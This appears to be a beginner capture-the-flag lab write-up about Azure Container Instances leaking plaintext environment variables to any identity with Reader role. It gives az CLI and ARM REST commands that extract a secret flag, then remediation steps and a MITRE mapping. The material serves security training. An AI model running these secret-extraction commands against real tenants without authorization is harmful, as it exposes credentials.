# Container Instance — Plaintext Environment Variables

**Difficulty:** Beginner | **Provider:** Azure | **Category:** Containers / Secrets

## Scenario

A team deployed an application on **Azure Container Instances** and stored sensitive
configuration — including an API key — as plain environment variables on the container.

In ACI, non-secure environment variables are returned in plaintext by the ARM API,
meaning any identity with **Reader** on the resource group can read them by calling
`az container show` — no access to the container runtime is required.

## Attack Path

```
[Attacker] Azure AD user (Reader on Resource Group)
    |
    v
az container show  -->  full container group definition JSON
    |
    v
containers[0].environmentVariables[?name=='SECRET_FLAG'].value  -->  flag
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — Inspect the container group

```bash
RESOURCE_GROUP="<resource_group_name>"
CONTAINER_GROUP="<container_group_name>"

az container show \
  --resource-group "${RESOURCE_GROUP}" \
  --name "${CONTAINER_GROUP}" \
  --output json
```

### Step 3 — Extract the flag

```bash
az container show \
  --resource-group "${RESOURCE_GROUP}" \
  --name "${CONTAINER_GROUP}" \
  --query "containers[0].environmentVariables[?name=='SECRET_FLAG'].value" \
  --output tsv
```

### Alternative — ARM REST API

```bash
TOKEN=$(az account get-access-token --query accessToken -o tsv)
SUBSCRIPTION_ID=$(az account show --query id -o tsv)

curl -s \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.ContainerInstance/containerGroups/${CONTAINER_GROUP}?api-version=2023-05-01" \
  -H "Authorization: Bearer ${TOKEN}" | \
  jq '.properties.containers[0].properties.environmentVariables'
```

## How to Fix in Production

1. **Use `secureEnvironmentVariables` instead of `environmentVariables`** for any
   sensitive values — secure env vars are not returned by the ARM API:
   ```hcl
   secure_environment_variables = {
     "SECRET_FLAG" = "..."
   }
   ```
2. **Use Azure Key Vault** with a Managed Identity on the container group — fetch
   secrets at startup rather than embedding them in the definition.
3. **Audit all container groups** for plaintext sensitive env vars:
   ```bash
   az container list --query "[*].{Name:name,RG:resourceGroup}" -o tsv | \
     while read name rg; do
       az container show -n "$name" -g "$rg" \
         --query "containers[0].environmentVariables[*].name" -o tsv
     done
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Cloud Infrastructure Discovery | T1580 |
| Container and Resource Discovery | T1613 |
